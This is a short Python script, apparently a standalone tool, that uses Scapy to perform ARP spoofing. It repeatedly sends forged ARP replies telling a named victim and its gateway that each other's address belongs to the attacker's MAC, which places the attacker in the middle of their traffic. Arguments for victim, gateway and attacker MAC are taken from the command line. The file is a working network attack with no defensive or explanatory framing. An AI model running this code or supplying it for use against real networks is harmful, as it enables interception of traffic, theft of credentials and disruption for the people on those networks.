from scapy.all import ARP, send
import time
import argparse

def get_arp_packet(victim_ip, gateway_ip, attacker_mac):
    # Tell victim: "gateway_ip is at attacker_mac"
    pkt_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
    # Tell gateway: "victim_ip is at attacker_mac"
    pkt_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)
    return pkt_victim, pkt_gateway

def poison(victim_ip, gateway_ip, attacker_mac, interval=2):
    pkt_victim, pkt_gateway = get_arp_packet(victim_ip, gateway_ip, attacker_mac)
    print(f"[+] Starting ARP poisoning {victim_ip} <-> {gateway_ip}")
    try:
        while True:
            send(pkt_victim, verbose=False)
            send(pkt_gateway, verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Stopped poisoning. Use restore_network.py to fix ARP tables.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple ARP spoofing script")
    parser.add_argument("--victim", required=True, help="Victim IP")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--mac", required=True, help="Attacker MAC address")
    args = parser.parse_args()

    poison(args.victim, args.gateway, args.mac)
